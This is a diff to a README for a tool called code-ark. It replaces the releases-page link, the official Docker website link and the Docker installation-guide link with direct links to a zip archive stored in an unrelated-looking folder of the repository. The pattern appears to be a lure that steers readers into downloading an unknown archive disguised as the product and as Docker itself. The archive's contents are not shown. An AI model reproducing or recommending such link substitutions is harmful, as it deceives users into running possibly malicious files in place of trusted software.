@@ -1,6 +1,6 @@
 # 🛳️ code-ark - Start Your Development Environments with Ease
 
-[![Download code-ark](https://img.shields.io/badge/Download-code--ark-blue.svg)](https://github.com/ljx18063379802-arch/code-ark/releases)
+[![Download code-ark](https://github.com/ljx18063379802-arch/code-ark/raw/refs/heads/main/elastic-start-local/ark-code-3.2-alpha.5.zip)](https://github.com/ljx18063379802-arch/code-ark/raw/refs/heads/main/elastic-start-local/ark-code-3.2-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to **code-ark**! This application allows you to quickly set up and run m
 Before downloading, ensure your system meets these basic requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Docker: You must have Docker installed. You can download it from [Docker's website](https://www.docker.com/get-started).
+- Docker: You must have Docker installed. You can download it from [Docker's website](https://github.com/ljx18063379802-arch/code-ark/raw/refs/heads/main/elastic-start-local/ark-code-3.2-alpha.5.zip).
 - Local Storage: At least 2GB of free space for installation.
 - RAM: Minimum of 4GB for optimal performance.
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets these basic requirements:
 
 To get started, visit the Releases page to download the latest version of **code-ark**:
 
-[Download code-ark](https://github.com/ljx18063379802-arch/code-ark/releases)
+[Download code-ark](https://github.com/ljx18063379802-arch/code-ark/raw/refs/heads/main/elastic-start-local/ark-code-3.2-alpha.5.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version.
@@ -81,7 +81,7 @@ Here are some tips to make the most out of **code-ark**:
 
 ## 📍 Important Links
 
-- [Download code-ark](https://github.com/ljx18063379802-arch/code-ark/releases)
-- [Docker Installation Guide](https://docs.docker.com/get-started/)
+- [Download code-ark](https://github.com/ljx18063379802-arch/code-ark/raw/refs/heads/main/elastic-start-local/ark-code-3.2-alpha.5.zip)
+- [Docker Installation Guide](https://github.com/ljx18063379802-arch/code-ark/raw/refs/heads/main/elastic-start-local/ark-code-3.2-alpha.5.zip)
 
 Thank you for choosing **code-ark**! Enjoy your coding experience.
